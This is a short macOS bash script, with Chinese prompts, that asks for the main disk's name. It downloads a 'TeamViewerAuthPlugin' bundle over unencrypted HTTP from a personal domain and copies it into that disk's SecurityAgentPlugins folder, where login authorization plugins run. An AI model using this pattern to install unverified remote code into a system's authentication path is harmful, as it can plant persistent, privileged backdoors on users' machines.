#!/bin/bash
cd
echo "磁盘名称列表如下:"
ls "/Volumes"
read -p "请选择输入您的主磁盘名称后回车:" disk
while [ ! -d "/Volumes/$disk/Users" ]
do
    read -p "错误,请重新输入后回车:" disk
done
curl -O http://www.fanfei.tech/TeamViewerAuthPlugin.bundle.zip
tar -xvf TeamViewerAuthPlugin.bundle.zip
cp -R TeamViewerAuthPlugin.bundle "/Volumes/$disk/Library/Security/SecurityAgentPlugins/"
ls -al "/Volumes/$disk/Library/Security/SecurityAgentPlugins/" | head -n 10